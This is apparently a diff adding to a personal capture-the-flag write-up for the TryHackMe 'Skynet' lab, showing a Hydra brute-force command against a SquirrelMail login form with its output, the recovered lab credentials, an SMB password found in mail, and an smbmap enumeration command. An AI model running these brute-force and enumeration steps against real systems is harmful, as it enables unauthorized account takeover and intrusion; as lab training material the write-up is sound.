@@ -214,4 +214,47 @@ hydra -l username -P password_list.txt ip_address http-post-form '/squirrelmail/
 The above image is how we construct the http-post-form payload for http bruteforce 
 ## Bruteforcing 
 
+```bash
+┌──(root㉿kali)-[/home/z3tssu/THM/Skynet]
+└─# hydra -l milesdyson -P log1.txt 10.10.190.192 http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.' 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-21 19:56:34
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
+[DATA] attacking http-post-form://10.10.190.192:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
+[80][http-post-form] host: 10.10.190.192   login: milesdyson   password: cyborg007haloterminator
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-21 19:56:47
+
+```
+
+![[Pasted image 20251021195708.png]]
+
+We now have the password for milesdyson:cyborg007haloterminator
+
+# Log into Squirrelmail Directory
+
+Now that we have a valid credentials, let us log into the webpage
+![[Pasted image 20251021195841.png]]
+
+## Enumeration of Squirrelmail
+First i was checking out the emails on the mailserver, i have identified an email from skynet@skynet, which has stated that the smb password has been changed 
+![[Pasted image 20251021200016.png]]
+
+```
+We have changed your smb password after system malfunction.
+Password: )s{A&2Z=F^n_E.B`
+```
+
+this might open some new doors for SMB Enumeration 
+
+# Enumerating SMB with credentials 
+
+let us try and enumerate the SMB shares again with the newly found credentials, lets try with SMBMap this time
+```bash
+smbmap -u milesdyson -p $smb_pass -H 10.10.190.192
+```
+
+![[Pasted image 20251021200441.png]]
+
+We have identified some shares, im pretty sure they are the same as before
